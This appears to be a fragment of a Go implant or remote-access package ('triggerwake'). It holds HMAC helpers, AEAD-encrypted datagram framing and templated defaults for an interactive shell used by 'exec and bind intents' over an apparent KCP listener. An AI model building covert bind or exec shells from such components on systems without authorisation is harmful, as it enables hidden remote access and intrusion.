// These avoid importing bindcrypto (which has its own sync.Once for
// key derivation) and keep the triggerwake package self-contained
// for the template renderer.

// cryptoRand is an alias to avoid name collision with the existing
// 'crypto/rand' import path reference.
var cryptoRand = rand.Reader

func hmacSHA256(data, key []byte) []byte {
	mac := hmac.New(sha256.New, key)
	mac.Write(data)
	return mac.Sum(nil)
}

func hmacEqual(a, b []byte) bool {
	return hmac.Equal(a, b)
}

func sha256Hash(parts ...[]byte) [32]byte {
	h := sha256.New()
	for _, p := range parts {
		h.Write(p)
	}
	var out [32]byte
	copy(out[:], h.Sum(nil))
	return out
}

func encryptDatagram(aead cipher.AEAD, seq uint64, plaintext []byte) []byte {
	nonce := make([]byte, aead.NonceSize())
	binary.LittleEndian.PutUint64(nonce[:8], seq)
	ct := aead.Seal(nil, nonce, plaintext, nil)
	out := make([]byte, len(nonce)+len(ct))
	copy(out, nonce)
	copy(out[len(nonce):], ct)
	return out
}

func decryptDatagram(aead cipher.AEAD, data []byte) ([]byte, uint64, error) {
	ns := aead.NonceSize()
	if len(data) < ns+aead.Overhead() {
		return nil, 0, fmt.Errorf("datagram too short")
	}
	nonce := data[:ns]
	ct := data[ns:]
	pt, err := aead.Open(nil, nonce, ct, nil)
	if err != nil {
		return nil, 0, err
	}
	seq := binary.LittleEndian.Uint64(nonce[:8])
	return pt, seq, nil
}

// defaultShellPath returns the conventional interactive shell for the
// current GOOS. Shared by exec and bind intents.
func defaultShellPath() string {
	// {{if eq .Config.GOOS "windows"}}
	return `C:\Windows\System32\cmd.exe`
	// {{else}}
	return "/bin/sh"
	// {{end}}
}

// defaultShellArgs returns the conventional argv for an interactive
// shell on the current GOOS.
func defaultShellArgs() []string {
	// {{if eq .Config.GOOS "windows"}}
	return nil
	// {{else}}
	return []string{"-i"}
	// {{end}}
}

// Forward references to keep imports clean.
var (
	_ = hex.EncodeToString
	_ = sha256.New
	_ = fmt.Sprintf
	_ = io.EOF
	_ = strconv.Itoa
	_ = binary.LittleEndian
	_ cipher.AEAD
	_ kcp.Listener
	_ = rand.Reader
)
